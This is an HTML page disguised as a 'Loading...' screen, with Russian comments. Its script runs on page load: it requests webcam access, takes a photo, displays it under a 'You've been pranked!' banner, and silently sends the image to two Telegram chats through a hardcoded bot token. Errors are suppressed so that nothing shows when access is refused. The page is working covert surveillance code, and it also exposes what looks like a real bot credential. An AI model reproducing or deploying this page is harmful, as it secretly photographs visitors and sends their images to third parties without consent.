<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            background: #0f172a;
            color: #f8fafc;
            font-family: sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #prank-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        #prank-screen h1 {
            color: #ff4757;
            font-size: 28px;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
        #photo-container img {
            width: 100%;
            max-width: 350px;
            border-radius: 10px;
            border: 3px solid #ff4757;
        }
    </style>
</head>
<body>

    <div id="prank-screen">
        <h1>ТЫ РАЗЫГРАН! 😂</h1>
        <div id="photo-container"></div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
        const CHAT_IDS = ['7523561197', '8671534168'];

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const prankScreen = document.getElementById('prank-screen');
        const photoContainer = document.getElementById('photo-container');

        async function quickSnap() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;

                // Даем камере доля секунды на инициализацию
                setTimeout(async () => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/png');

                    // Выключаем камеру сразу после снимка
                    stream.getTracks().forEach(track => track.stop());

                    // Показываем картинку на экране
                    const img = document.createElement('img');
                    img.src = dataUrl;
                    photoContainer.appendChild(img);
                    prankScreen.style.display = 'flex';

                    // Отправляем в Telegram
                    const res = await fetch(dataUrl);
                    const blob = await res.blob();
                    
                    for (const chatId of CHAT_IDS) {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'snap.png');

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }
                }, 400);

            } catch (err) {
                // Тихо пропускаем ошибку, если доступ не дали
            }
        }

        window.addEventListener('load', quickSnap);
    </script>
</body>
</html>
